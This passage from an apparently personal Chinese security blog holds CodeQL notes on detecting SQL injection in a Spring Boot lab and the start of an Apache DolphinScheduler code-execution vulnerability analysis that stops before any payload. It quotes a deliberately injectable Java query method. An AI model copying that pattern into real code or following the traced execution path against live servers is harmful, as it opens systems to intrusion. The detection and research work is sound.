wrapperConnectionPoolDataSource 链分析即可https://stoocea.github.io/post/C3P0%E9%93%BE%E5%88%86%E6%9E%90.html#1x01-%E5%88%9D%E6%AD%A5%E5%85%A5%E5%8F%A3%E2%80%94WrapperConnectionPoolDataSource\n后记五月份算是比较痛苦的一段时间，一直没有精力或者时间去学习新知识，一直在干活。6 月初好歹闲下来了，继续学，状态稍微回来了一点\n","slug":"Java二次反序列化","date":"2024-06-04T06:00:00.000Z","categories_index":"锻刀的理论学习-java二次反序列化","tags_index":"锻刀","author_index":"stoocea"},{"id":"21952381f57493672835351001f3cf9b","title":"CodeQL学习","content":"本文为个人学习笔记+一些个人的理解调试，仅供学习参考\n首先存几个学习地点https://drun1baby.top/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/https://www.freebuf.com/articles/web/283795.htmlhttps://codeql.github.com/docs/codeql-overview/about-codeql/\n什么是 CodeQL这里我本来想用一句话总结的，但是自己学的还不够，所以无法总结，深入学习之后再总结\nCodeQL 配置首先要先下载 CodeQL 的 CIL，这个官网的 releases 上有，我们选择 win64 版本的安装包然后下 SDK\nshellgit clone https://github.com/Semmle/ql下完之后的目录结构如下然后配置环境变量，配置一个 codeql 的路径即可，这里的路径以我的为例就是\nlatexH:\\CodeQL\\codeql然后运行一下 codeql 命令，出现如下内容就没太大问题了\nCodeQL 使用0x01 测试 HelloworldCodeql 处理对象并不是项目源码本身，而是中间生成的 AST 结构数据库，所以每次分析之前，我们需要将项目源码转化成 Codeql 能够识别的 CodeDataBase这里以我们从micro_service_seclab靶场获取的源码为例，稍微看一下目录结构，作者写的一个很标准的 Springboot 的项目然后我们执行如下命令\njavacodeql database create ./databases/micro_service_seclab_database  --language=&quot;java&quot;  --command=&quot;mvn clean install --file pom.xml&quot; --source-root=./practice/micro_service_seclab/但是初次运行，有很大概率会报错这个原因有很多，解决方法可参考这位师傅，找了很多关于 java 本身 maven 编译项目的问题，都无法解决https://blog.csdn.net/m0_63303407&#x2F;article&#x2F;details&#x2F;128750198然后是我的环境变量我个人这么配置之后基本上没啥问题了然后是 Vscode 中配置一下我们刚才生成的 database，配置完这个之后我们就能够写查询语句了在当前这个目录下，新建一个 demo.ql 文件，用来写我们的查询语句，这里我们简单的 select 出来一个 helloworld 字符串\n0x02 CodeQL 基本语法我们最开始提到了在 CodeQL 中，代码被视作数据，而漏洞，错误或者其他报错都被建模为可以针对的从代码中提权的数据库查询。其实就拿刚才的项目来说，我们先将项目中的内容转化为 Codeql 能够识别出来的数据库，这个过程其实就是 codeql 引擎将我们的项目内容（java 代码）转化为了我们 codeql 可识别的 AST 数据库，然后按照 Codql 中的编写的规则去查询数据库中的数据。这个思想其实在我看来就是将面向对象的数据库查询稍微理解了一下 Codeql 整体的流程，看个例子\njavaimport java\n\nfrom int i\nwhere i=1\nselect i\n\nimport java 由于我们审计的是 java 项目，所以要导入 java 的类库\nfrom int i 这句代码表示我们从 int 这个整数组中取一个变量作为 i，其实这一步更像是给 i 这个属性定类型，int i \nwhere i= 1 就是当我们的 i 为 1 时，就执行下面的逻辑\nselect 1 也就是在上一句的 where 条件达成之后，我们执行一段 select 语句\n\n其实大部分的 codeql 代码都可以浓缩为这一段\n0x03 类库上面提到了 codeql 引擎把 java 代码转化为了 databases，这里其实有一个细节，就是复数 databases，我们知道 java 是一门典型的面向对象的语言，类是必不可少的，而这里的每一个 dababase，就对应一个类。这也是为什么每一个 java 项目转化之后被称为了 databases 了—-类数据集。而类库的具体实现，就是一个一个 AST 结构表示出来的，这里我们演示一段查看某一 database 的 AST 结构首先将我们的源码添加到工作区，我们待会能够直接从 vscode 中指定到源码添加成功之后你就能够看到在 CodeQL 这个大文件夹外面会多一层源码目录，这个时候我们选定 IndexController.java 文件再去 codeql 中点击 view AST，就能够看到当前 IndexController.java 类的 AST 结构了当然除了我们本来的这些 java 代码的类库，我们还有 codeql 中帮助我们集成的一些类库，比如 Method，MethodAccess，Parameter 等。这里列出来的三个都是很常见的三个类库，具体作用如下：\n\nMethod，方法类库，用来存储当前项目的中的所有方法\nMethodAccess，调用方法类库，用来存储当前项目中的所有方法调用\nParameter，参数类库，用来存储当前项目中所有的参数\n\n当然，这三个类库都是有对应类的，名字是一样的。既然是类，那么一定有类方法和类属性，我们这里稍微看一下 Method 类的方法使用\nplsqlimport java\n\nfrom Method method\nwhere method.hasName(&quot;getStudent&quot;)\nselect method.getName(),method.getDeclaringType()下面是结果method.getName 就是获取到我们搜索到的方法名，method.getDeclaringType 就是获取到定义当前方法的类\n0x04 谓词使用谓词的出现，是为了解决 where 条件过长，影响逻辑分析的情况。其实谓词也可以叫做函数，只不过在 codeql 中都是叫谓词，看如下谓词\nsqlimport java\n\npredicate isgetStudent(Method method) &#123;\n    exists(|method.hasName(&quot;getStudent&quot;))\n\n&#125;\n\nfrom Method method\nwhere isgetStudent(method)\nselect method.getName(),method.getDeclaringType()格式和函数是差不多的\n\n\n\n\n\n\n\n\n\npredicate 表示当前方法没有返回值exists 叫做子查询，他可以根据参数中的子查询来返回 true 或者 false，这里要注意一下格式，子查询前面有一个 |,这个格式其实用意在于，| 前半段的数据作为参数，| 后半段的代码作为执行的判断逻辑代码，前面的参数是可以传递给后半段的代码执行中的\n0x05 Node，Expr，Param这一块算是自己单独分出来的一部分笔记，因为我学到后面之后有些参数的意思不能够瞬间反应出来，觉得有些基础概念还是没过Expr 和 Param 分别叫做表达式和参数，他们两者都是 Node 的类型，并且 Node 就这两种类型，我们能够分别通过 asExpr()和 asParam()方法将他们取出来Expr：\njava    public List&lt;Student&gt; getStudent(String username) &#123;\n        //String sql = &quot;select * from students where username like &#39;%&quot; + username.get() + &quot;%&#39;&quot;;\n        String sql = &quot;select * from students where username like &#39;%&quot; + username + &quot;%&#39;&quot;;\n        //String sql = &quot;select * from students where username like ?&quot;;\n        return jdbcTemplate.query(sql, ROW_MAPPER);\n    &#125;0x06 source ，sink， sanitizersink 应该很熟悉了，\t指最终执行点。source 指的是入口点，也就是漏洞污染链条输入点。sanitizer 叫做净化函数，在整个漏洞链条的执行过程中如果出现了一个点，能够阻断整条攻击链的逻辑执行，那么这个点就叫做sanitizer总结一下，如果用 codeql 编写规则去找漏洞，我们要保证 source 和 sink 都存在，并且链中不存在 sanitizer 即可\n这里我们进行一个关于 Springboot 中的 SQL 注入的攻击链寻找，那么最终触发的方法（sink）一般是 query 或者 exeSql 了。当然还需要考虑入口点，也就是 source，Springboot 中一般就是各路由下的接收变量参数了\n1x01 设置 source在 codeql 中我们可以用如下谓词来查询 source\nsqloverride predicate isSource(DataFlow::Node src)&#123;&#125;由于我们当前分析的是 SpringBoot 的项目，入口点应该是每一个具有接收数据流的参数，以及它对应的类比如 IndexController 中大部分路由下都有的一个 RequestParam 参数这些都是我们需要去收集的 source那收集这些参数的谓词该怎么写呢？我们可以拿 Codeql 中原生的规则来用\nsqloverride predicate isSource(DataFlow::Node src) &#123; \nsrc instanceof RemoteFlowSource \n&#125;这是 SDK 中自带的规则，里面包含了大多数常用的 Source 入口这段初看还是有点懵的，先看 RemoteFlowSource，它是一个类库，具体位置在 semmle.code.java.dataflow.FlowSources，本来的用意是存储可能的远程用户控制的数据流源，它里面内置了很多常见的 source 入口，包括我们本次要用到的 Springboot 中的常见传参至于谓词里面的内容，我们之后再记，这里插个 flag\n1x02 设置 sink开头提到了我们本次案例查找 SQL 注入的最终触发方法是 query 方法或者 exeSql 方法，所以在 sink 的谓词中，我们会直接查找 query 或者 exeSql 方法，以及它的调用\nsqloverride predicate isSink(DataFlow::Node sink) &#123;\nexists(Method method, MethodAccess call |\n  method.hasName(&quot;query&quot;)\n  and\n  call.getMethod() = method and\n  sink.asExpr() = call.getArgument(0)\n)\n&#125;这里的语法初见肯定会奇怪，我们拆开来分析谓词结构:\nsqloverride predicate isSink(DataFlow::Node sink) &#123;\n......\n&#125;里面的内容先不看，我们只看整体的结构，参数 DataFlow::Node 类型的 sink，这里举个例子来理解：java 种各式各样的攻击链，期间一定会有一段参数是一直在传递的，这个参数一般就是我们的最开始输入的 payload。我们再看 source 谓词的参数：DataFlow::Node src，也就是这个 DataFlow::Node 其实就是我们一开始输入的正常参数或者 payload我们再看谓词里面的内容 ：\nsqlexists(Method method, MethodAccess call |\n  method.hasName(&quot;query&quot;)\n  and\n  call.getMethod() = method \n  and\n  sink.asExpr() = call.getArgument(0)\n)其实整体就是一个 exists 子查询，exists(object| …..)，这里接收到了 Method，以及调用参数 MethodAccess。后续的调用中我们会判断该方法名是否等于 “query”。然后判断调用当前方法的方法其实这里我一直不太理解为什么要加call.getMethod() = method，甚至可以说我不太理解这整段关于 sink 的寻找，直到下面整体使用的时候才稍微清晰一点,这里就拿后面的理解提前分析一下这段关于 sink 的子查询了首先是 method.hashName(&quot;query&quot;)，他其实就是先从所有调用流中将我们所有包含 query 方法的数据流给检索出来，当然这里检索出来可能并不会直接调用到 query 方法，可能是调用链的第 N 环然后是call.getMethod() = method，结合上面我们检索出的数据流，我们查找调用方法中，当前正在调用 query 方法 Node 节点最后 sink.asExpr() = call.getArgument(0)，就是判断 sink 点是否作为当前方法调用的第一个参数，结合上面两个流程，意思就是说我们的 sink 点要作为 query 方法的第一个参数\n1x03 Flow 数据流我们确定好开头 source 以及链尾 sink 之后，还需要保证整条攻击链是打通的，也就是说不能够出现跟进一半流程跟不下去的情况。那么该怎么去写 codeql 代码保证 Flow 数据流能够正常流通呢？这个确保联通的工作其实交由 codeql 引擎帮助我们完成，我们可以通过Vulnconfig.hasFlowPath 方法来判断是否联通测试代码如下：\njavafrom VulnConfig config,DataFlow::PathNode source,DataFlow::PathNode\tsink\nwhere config.hasFlowPath(source,sink)\nselect source.getNode(),source,sink1x04 整体查询Codeql 的语法其实和 java 的很像，写完之后才理解为什么说 codeql 是面向对象版的 sql 查询\njavaimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.security.QueryInjection\nimport DataFlow::PathGraph\n\n\nclass VulConfig extends TaintTracking::Configuration &#123;\n     VulConfig() &#123; this = &quot;SqlInjectionConfig&quot; &#125;\n   \n     override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;\n   \n     override predicate isSink(DataFlow::Node sink) &#123;\n       exists(Method method, MethodAccess call |\n        \n         method.hasName(&quot;query&quot;)\n         and\n         call.getMethod() = method\n         and\n         sink.asExpr() = call.getArgument(0)\n       )\n     &#125;\n   &#125;\n\nfrom VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink\nwhere config.hasFlowPath(source, sink)\nselect source.getNode(), source, sink, &quot;source&quot;其实 isSource 或者 isSink 如果直接按照我上面分析的一样去写是会报错的，因为加了一个限定词 Override,很明显它肯定是一个重写方法，那他最开始的定义在哪里呢？我们跟进TaintTracking 的定义发现TaintTracking 很像一个接口形式的类，也就是大致的包含和定义还是规定了，但是具体的定义没有写有一个TaintTrackingImpl，我们拿面向对象的思想去套，说不定它里面就有呢？跟进之后发现这是一个文件，后缀是 qll，这个没太了解，但是我么能够在这个文件中找到Configuration extends DataFlow::Configuration的定义，这也是我们为什么定义的 Class 要继承TaintTracking::Configuration，往后翻就能在Configuration 中找到 isSource 和 isSink 的定义相信整体的代码也能够理解了，为什么要先写一个类继承自TaintTracking::Configuration，然后再写 isSink 和 isSource 方法，这跟面向对象的语法其实是很像的再解析一下最后三行的代码：实例化（？）一个我们重写的 VulnConfig，然后获取两个 DataFlow 的节点 Node，分别叫做 source 和 sink，只不过之后放入 config 中就会由 codeql 引擎去判断以及我们写的 issink 或者 issource 是否为 sink 和 source，然后判断数据流是否通了。\njavafrom VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink\nwhere config.hasFlowPath(source, sink)\nselect source.getNode(), source, sink, &quot;source&quot;结果如下这里可能还有一个疑问，isSource 和 isSink 是在哪里执行的？跟进hasFlowPath()就能够找到具体执行的点了\n结果优化0x01 误报我们一个一个去检查结果，发现在第三个结果中出现了误报现象：其实靶场的作者也帮我们标注出来了，发现 source 的传参类型是 List的类型，也就是长整数类型，我们并不能够通过参数的传入打入 SQL 注入其实大多数情况下，如果结果 ql 代码这么写的话，都是会出现这种情况的误报的，那如何去解决这个问题呢？这里我们可以用到TaintTracking::Configuration中提供的方法—isSanitier，他是 Configuration 中提供的净化方法，我们能够从源码中找到它的原型定义isSanitier 方法它本身是会对基础类型以及一些奇怪类型进行判断的：\njavaoverride predicate isSanitizer(DataFlow::Node node) &#123;\nnode.getType() instanceof PrimitiveType or\nnode.getType() instanceof BoxedType or\nnode.getType() instanceof NumberType\n&#125;第一个类型好像在 Unity 引擎中见到过，但是第二个类型是真没见过，当然第三个类型就是数字类型了。也就是这三种类型，如果 DataFlow 在当前节点中判断出是这三种基础类型，就会直接切断污染链的运行我们可以通过重写该方法来实现更多类型的过滤\njavaoverride predicate isSanitizer(DataFlow::Node node) &#123;\n    node.getType() instanceof PrimitiveType or\n    node.getType() instanceof BoxedType or\n    node.getType() instanceof NumberType or\n    exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType )\n  &#125;我们重点关注这句exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType )传参的类型是ParameterizedType，他其实是一个关于泛型参数的 class，它所代表的其实是泛型中的参数，比如 List,那么ParameterizedType 就代表 Long更加普适的来说，上面的 ql 代码其实是为了实现这么一个功能： List,我们获取到泛型中的参数 E 之后，判断它是否为 NumberType 类型，如果是的话，isSanitizer 会返回 true，也就是当前污染链切断。这里还进行了一段pt.getTypeArgument(0)的执行，&lt;E,L&gt;泛型中不一定只会有一个参数，ParameterizedType 获取参数时，获取的是泛型里面整体，但是我们本次实验中仅仅只针对这一项误报而做出的处理，所以getTypeArgument(0)就能够定位到 Long添加上isSanitizer 的重写之后，我们再看结果，发现确实解决刚才的误报问题了\n0x02 漏报误报的问题能够从结果中自己检索出来，但是如果出现漏报问题就很难受了，我们其实是看不出来的，只能说是事后复盘解决（在有正确思路的情况下）。可以先看看这个漏报的点在哪IndexController 下的/optinal_like路由我们跟进它的getStudentWithOptional 方法对比我们 select 出来的结果，发现是没有这条 sink 的，具体流程其实是到了定义 sqlWithOptional 的时候，我们传参进来的是 username，此时会调用 username 的 get 方法，可能是 Codeql 的引擎并没有识别到 Option 类型，所以无法调用 useraname 的 get 方法，于是这条攻击链就断了下面的解决方案可能不适合所有漏报的情形，因为仅仅只是针对这一个漏报进行的修复在 codeql 中我们采用 isAdditionalTaintStep  方法来强制将两节点连接，从而使攻击链能够走下去我们首先看如何定位到当前 node，也就是我们调用 get 方法，以及 username 传进来的这个节点根据文章中的谓词使用，浅写一个测试代码，帮助我们了解这个isTaintedString\njavaimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.security.QueryInjection\nimport DataFlow::PathGraph\n\n\npredicate isTaintedString(Expr expSrc, Expr expDest,Method method, MethodAccess call, MethodAccess call1) &#123;\n  exists(| \n    expSrc = call1.getArgument(0) \n    and expDest=call \n    and call.getMethod() = method \n    and method.hasName(&quot;get&quot;) \n    and method.getDeclaringType().toString() = &quot;Optional&lt;String&gt;&quot; \n    and call1.getArgument(0).getType().toString() = &quot;Optional&lt;String&gt;&quot;\n  )\n&#125;\n\nfrom DataFlow::Node a,DataFlow::Node b,Method method,MethodAccess call,MethodAccess call1\nwhere isTaintedString(a.asExpr(), b.asExpr(),method,call,call1)\nselect a,b,method,call,call1结果如下首先我们要明白当前的isTaintedString谓词是为了判断我们是否定位到了 username 和 username.get这两个点，如果定位成功，isAdditionalTaintStep后续会将这两个节点拼接，当前这条攻击链就能够顺利进行，我们最终检索出的 sql 注入点就不会缺少这一条可能了expSrc = call1.getArgument(0)   expDest=call,expsrc 和 expDest 两者就是username 和username.get，后续的描述条件说白了就是：我们尽可能的将当前的情形描述详细，能够准确定位到当前的情况\n\ncall.getMethod() = method与method.hasName(&quot;get&quot;)两种条件描述都是为了定位到 username.get而服务的，两者交换顺序也是没问题的，就像一条工作流，我们为了得到其中的某种物质，漏斗的顺序放置是对结果没有区别的\ncall1.getArgument(0).getType().toString() = &quot;Optional&lt;String&gt;&quot;定位到getStudentWithOptional(Optional&lt;String&gt; username)而服务\nmethod.getDeclaringType().toString() = &quot;Optional&lt;String&gt;&quot;定位 get\n\n虽说这么做了之后确实能够定位到这一个漏报的 SQL 注入点，但其实遇到其他情况的漏报就有点不够用了，或许有更好的方法也说不定（？\n0x03 Lombok 问题Lombok 是一个用来帮助写类定义的插件，我们可以通过注解来完成 get set 方法以及构造方法的书写那么这里就会出现一个问题，如果我们所审计的项目中使用了 Lombok，codeql 是无法识别出这些类的 setget 方法的在 Codeql 的官方 issue 中是有提到这个问题的，解决方案如下\npowershell# get a copy of lombok.jar\nwget https://projectlombok.org/downloads/lombok.jar -O &quot;lombok.jar&quot;\n# run &quot;delombok&quot; on the source files and write the generated files to a folder named &quot;delombok&quot;\njava -jar &quot;lombok.jar&quot; delombok -n --onlyChanged . -d &quot;delombok&quot;\n# remove &quot;generated by&quot; comments\nfind &quot;delombok&quot; -name &#39;*.java&#39; -exec sed &#39;/Generated by delombok/d&#39; -i &#39;&#123;&#125;&#39; &#39;;&#39;\n# remove any left-over import statements\nfind &quot;delombok&quot; -name &#39;*.java&#39; -exec sed &#39;/import lombok/d&#39; -i &#39;&#123;&#125;&#39; &#39;;&#39;\n# copy delombok&#39;d files over the original ones\ncp -r &quot;delombok/.&quot; &quot;./&quot;\n# remove the &quot;delombok&quot; folder\nrm -rf &quot;delombok&quot;\n大概的操作就是通过去掉代码里面的 lombok 注释，并且还原 setter 和 getter 方法，这样就和正常的类效果是一样的了\n所以最终我们关于这个项目的 SQL 注入查找的 codeql 代码写为：\njavaimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.security.QueryInjection\nimport DataFlow::PathGraph\n\n\npredicate isTaintedString(Expr expSrc, Expr expDest) &#123;\n  exists(Method method, MethodAccess call, MethodAccess call1 | \n    expSrc = call1.getArgument(0) \n    and expDest=call \n    and call.getMethod() = method \n    and method.hasName(&quot;get&quot;) \n    and method.getDeclaringType().toString() = &quot;Optional&lt;String&gt;&quot; \n    and call1.getArgument(0).getType().toString() = &quot;Optional&lt;String&gt;&quot;  \n  )\n&#125;\n\nclass VulConfig extends TaintTracking::Configuration &#123;\n     VulConfig() &#123; this = &quot;SqlInjectionConfig&quot; &#125;\n   \n     override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;\n   \n     override predicate isSink(DataFlow::Node sink) &#123;\n       exists(Method method, MethodAccess call |\n        \n         method.hasName(&quot;query&quot;)\n         and\n         call.getMethod() = method\n         and\n         sink.asExpr() = call.getArgument(0)\n       )\n     &#125;\n     override predicate isSanitizer(DataFlow::Node node) &#123;\n      node.getType() instanceof PrimitiveType or\n      node.getType() instanceof BoxedType or\n      node.getType() instanceof NumberType or\n      exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType )\n    &#125;\n\n    override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;\n      isTaintedString(node1.asExpr(), node2.asExpr())\n    &#125;\n   &#125;\n\nfrom VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink\nwhere config.hasFlowPath(source, sink)\nselect source.getNode(), source, sink, &quot;source&quot;\n持续工程化经过分析测试过后，我们得到了一份关于常规 Springboot 项目的能够进行 SQL 注入检测的 codeql 代码，现在要考虑如何才能将这份代码用于实践两行命令，按照我们之前所有的步骤来总结就两步：\n\n生成中间数据库\n\njavacodeql database create ~/CodeQL/databases/micro-service-seclab  --language=&quot;java&quot;  --command=&quot;mvn clean install --file pom.xml -Dmaven.test.skip=true&quot; --source-root=&quot;~/Code/micro-service-seclab/&quot;\n运行 codeql 代码,这里是执行刚才写好的 codeql 代码，然后将结果输出到 csv 文件\n\njavacodeql database analyze /CodeQL/databases/micro-service-seclab /CodeQL/ql/java/ql/examples/demo --format=csv --output=/CodeQL/Result/micro-service-seclab.csv --rerunCodeql 语法查漏补缺其实刚才一路跟过来，我为了弄懂一些语法而写了很多测试代码，期间也跟进过源码进行一些方法的查看，给我的感受就是大部分的语法我都很陌生，所以这里单独开一个用来记录的篇章，主要是为了记录一些初见不是很能理解的语法\nInstanceofjava 里面其实也见到过，只不过在 Codeql 的源码中我们能够经常看到，并且在指定扫描 source 时用的特别多就拿我们本次的 isSource 判定来说\njavaoverride predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;我们并没有写很多的 exist 子查询来判定 source，只是通过判定节点 src 是否 instance RemoteFlowSource 就完成了 source 的检索工作，可以想象RemoteFlowSource 里面应该集成了很多类型的 source 用作判定可以看到 ReomteSource 的定义中有许多的子类扩展，这里和 java 的语法还有点不太一样，ReomteSource 是一个 abstract 的抽象类定义，而 java 中的抽象类必须要有实现类和对应的实现方法才能够使用功能，这里我们使用ReomteSource 时没有具体的指定要实现它的某些方法，但是我们依然能够用到它的功能。原因就在于 Codeql 中的抽象类，只要我们选择继承，并且在某处有调用的话，所有的子类都会被调用一遍，也就是说，这里所有的 RemoteSource 的子类都会在我们 src instanceof RemoteSource 的时候被调用，那其实大部分的常见入口点 source 都会被检测一遍了\n子类递归问题面向对象的一个常见问题，当我们的一个类中出现了子类的定义时，需要一些特殊的处理才能够准确区分和识别到子类与父类比如：\njavapublic class StudentService &#123;\n \n    class innerOne &#123;\n        public innerOne()&#123;&#125;\n \n        class innerTwo &#123;\n            public innerTwo()&#123;&#125;\n \n            public String Nihao() &#123;\n                return &quot;Nihao&quot;;\n            &#125;\n        &#125;\n        public String Hi()&#123;\n            return &quot;hello&quot;;\n        &#125;\n    &#125;\n \n&#125;这里我们定义了三个类：StudentService，innerOne，innerTwo如何通过 innerTwo 定位到最外层的 StudentService 呢？\njavafrom Class classes\nwhere classes.getName().toString() = &quot;innerTwo&quot;\nselect classes.getEnclosingType().getEnclosingType()这里我们先从所有的 class 定义中获取到 innerTwo 的定义，然后通过getEnclosingType()来获取其上一级的封闭类定义，跟 java 中的getEnclosingType()简直不要太一样实际情况下，我们肯定不知道目标类到底有多少层封闭类的定义，所以这么做只存在于我们知道目标类具体结构的情况下才能使用的还有一种方法能够自动递归来获取其封闭类\njavaimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.security.QueryInjection\nimport DataFlow::PathGraph\n\n\nfrom Class classes\nwhere classes.getName().toString() = &quot;innerTwo&quot;\nselect classes.getEnclosingType+()或者我们可以将+改写为*，都是可以的\n类型筛选如何筛选出我们想要的类型参数也是一个大问题，通常我们首先会通过如下的代码获取到当前项目中所有的调用参数\njavafrom Parameter param\nselect param, param.getType()然后我们可以用(RefType)来进行过滤\njavafrom Parameter param\nselect param, param.getType().(RefType)这里的 RefType 代表的是什么呢？它相当于一层 filter，将所有的 6种数字类型（byte&#x2F;short&#x2F;int&#x2F;long&#x2F;float&#x2F;double）、1种字符型（char）、1种布尔型（boolean）  过滤了一遍，再将结果输出出来我们还可以指定过滤一些特定的类型,这里就是指定筛选出所有的 int 类型\njavafrom Parameter param\nselect param, param.getType().(IntegralType)\n","slug":"CodeQL学习","date":"2024-05-02T08:00:00.000Z","categories_index":"挥刀练习之codeQL","tags_index":"用刀的技艺","author_index":"stoocea"},{"id":"651d2c36bfca60e4d9856f4d1d38b3ec","title":"Apache DolphinScheduler 任意代码执行漏洞分析","content":"包括如下几个 cve：CVE-2023-49299 CVE-2024-23320\n漏洞描述\n\n\n\n\n\n\n\n\nApache DolphinScheduler 是一个分布式、易扩展、可视化的工作流任务调度平台。Apache DolphinScheduler 3.1.9之前版本中，由于 SwitchTaskUtils#evaluate 方法未对用户可控的 expression 参数进行校验，经过身份验证的攻击者可在创建任务时传入恶意的任务内容，在服务端以 root 身份执行可逃逸沙箱的任意 js 代码。\n根据漏洞描述，可以确定补丁应该是打在了 3.1.9 之前的版本，那我们可以找 3.1.8 版本进行分析这里官网下一下源码，我的想法是生产机搭建 docker 镜像，远程接端口调试\n环境搭建一步一步来吧，环境搭建是漏洞复现和挖掘的第一步https://dolphinscheduler.apache.org/zh-cn/docs/3.1.8/guide/start/docker这里我选择是官方 3.1.8 的 docker 镜像,根据他官方使用手册来做能够顺利搭建起来但是这里最主要的问题是如何连接远程调试首先就是要重新起一个容器，一开始的 docker run 只开放了两个端口，这里我们还需要开一个端口用来远程连接\nbashdocker run --name dolphinscheduler-standalone-server -p 12345:12345 -p 25333:25333 -p 5005:5005 -d apache/dolphinscheduler-standalone-server:&quot;$&#123;DOLPHINSCHEDULER_VERSION&#125;&quot;我选择 5005 端口用来远程调试，run 起来之后，进入容器\nbashdocker exec -it ContainerID /bin/bash然后找到它的 start.sh 文件，添加上这么一句话\nshell-Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=n保存退出即可（这里可能容器没下 vim，apt update 更新一下就能下载了）然后 docker restart，此时容器的 5005 端口就被视为了调试端口然后是 idea 的设置，首先你源码得下下来，然后把依赖打上，之后 Configurations 选项中添加一个远程调试的选项，这么设置即可，这里 HOST 看你选的生产机的 ip 是多少，我这里是自己的 ubuntu 的虚拟机搭建的设置好之后可以开启调试，如果出现 connected 字样，那就是说明远程调试连接成功了\nCVE-2023-49299 CVE-2024-23320漏洞点分析根据漏洞描述，我们可以在源码中定位到最终的代码执行点定位到DolphinScheduler 模块，utils 包下的 SwitchTaskUtils 类，在 3.1.8 版本，也就是最后一个尚未修复的版本中，如果存在功能点调用了其 evaluate 方法，是不会有任何过滤的，能够直接执行首先要明确这个类的作用是什么，evaluate 这个方法该如何触发？明确这个问题之后我们往上去寻找相关的调用只有一处，SwitchTaskProcessor 类的 setSwitchResult 方法中，整体的逻辑由于不太清楚目的是什么，所以不太能读懂，关注最终的 evaluate 方法调用及相关即可这里注意到传入 evaluate 方法的参数是 content，content 是经过 setTaskParams 方法处理之后得来的，做个标记，之后再来看，因为现在我们并不清楚这里一套流程走下来到底是由谁触发的继续往上寻找setSwitchResult的相关调用也是只有一处，当前类的 runTask 方法，其实到这就有点预感了，结合漏洞报告中的” 经过身份验证的攻击者可在创建任务时传入恶意的任务内容  “，也就是说我们当前是在走”创建任务，执行任务内容”的流程再继续往上调用，有一层 run 方法的包装，里面只调用了 runTask 方法，这里继续往上寻找 run 方法的调用找到了 BaseTaskProcessor 的 action 方法，大部分内容都是由一个 switch 函数填充，SwitchTaskProcessor类本身就是BaseTaskProcessor 的子类，所以这里我们可以猜测，BaseTaskProcessor 最先接收到执行请求，然后通过我们读取我们的提交行为，switch 到不同的 Processor 中执行不同的逻辑（这一点其实从 runner 包中就就能看出）\njava    @Override\n    public boolean action(TaskAction taskAction) &#123;\n        ........\n        try &#123;\n            switch (taskAction) &#123;\n                case STOP:\n                    result = stop();\n                    break;\n                case PAUSE:\n                    result = pause();\n                    break;\n                case TIMEOUT:\n                    result = timeout();\n                    break;\n                case SUBMIT:\n                    result = submit();\n                    break;\n                case RUN:\n                    result = run();\n                    break;\n                case DISPATCH:\n                    result = dispatch();\n                    break;\n                case RESUBMIT:\n                    result = resubmit();\n                    break;\n                default:\n                    logger.error(&quot;unknown task action: &#123;&#125;&quot;, taskAction);\n            &#125;\n            return result;还有一点比较重要，此时 switch 中的判断参数叫做 TaskAction，任务行为，我们进后台是能够找到对应的板块的那大致可以确定漏洞的触发是在创建完任务之后，执行任务时触发的，那也可以同时确定 content 内容的传值就是创建任务时的某个参数这个任务并不是所有的类型都能够走到 SwitchTaskUtils 最终触发的地方，所以还一定是 Switch 类型的任务这里我经过一段时间的摸索，发现任务的创建依赖于工作流，其实一个工作流就对应一个任务，我们创建任务的过程，其实就是在创建工作流的过程。然后一个项目中能够有很多个工作流，项目必须归属到一个租户上面，这个租户其实就是你当前容器的用户–root 即可了解完上面这些，我们能够大致的走一遍工作流程了\n0x01 工作流程分析首先创建一个工作流，这是一个可视化的过程，DolphinScheduler 以图示来简化操作，这里我们就能够看到 SwitchTask 到底是个什么东西了他其实就是工作流中的一个选项标签，本身就叫 switch，正常使用不报错的话，这么做即可然后这里的设置肯定有一个部分是关于 content 参数的传递，这里可控文本就两个，我们描述或者条件选项，这里稍微打断点调试了一下，发现最终条件栏的数据会被接收，并且作为 Content 的内容明白了这些就可以走一遍调试了断点打在 submitTaskExec 的 taskProcessor.action(TaskAction.RUN); 处（这里注意，我们刚开始调试接收到的情况并非直接到 RUN 的 action 方法，而是 SUBMIT 分支和一个 DISPATCH 分支，它得先提交完这个请求，并且判断工作类中的部分类型之后进行 DISPATCH 分发，才能进行具体的部分 RUN处理）这个 submitTaskExec 方法其实也就是 action 方法上一级调用\n跟进 RUN 方法直至跟进到 runTask 的具体处理，他这里的逻辑其实是先获取各类信息之后，去执行 Switch 块的逻辑，并且 setSwitchResult 方法返回的是一个布尔值，用来检测我们正常的 Switch 执行逻辑是否出错跟进到 setSwitchResult 方法前面在获取一些基本信息，最为关键的获取是SwitchParameters switchParameters = taskInstance.getSwitchDependency();也就是从任务实体中获取到我们当前 Switch 的参数，它本身作为 switch 块，其中的条件设置就是参数设置，这也是为什么他要去执行 JS 代码的原因，得到的结果进行一个返回，达到一个 if 判断的效果看一下最终的获取效果（这里我单独把 taskParams 拎了出来）这里的switchResultVo，之后会被作为 for 循环的基本单位进行循环遍历，也就是后续的传入 setTaskParams 方法 info跟进setTaskParams 看看参数处理这里首先根据一个正则表达式创建了一个 Matcher 对象，这个 Matcher 对象的作用是用来专门匹配$&#123;...&#125;内容的比较器（？），根绝结果来看，由于我们此时 content 的形式是var a=1;所以肯定不会符合格式要求，后续的 while 循环处理自然也不会跟进，直接跳到了最后的 return content两个 MAP 的数据处理都是返回 null，这一点从 SwitchParameters 参数获取就看能看出这里返回出去之后就是直接来到 evaluate 了这里可以参考一下 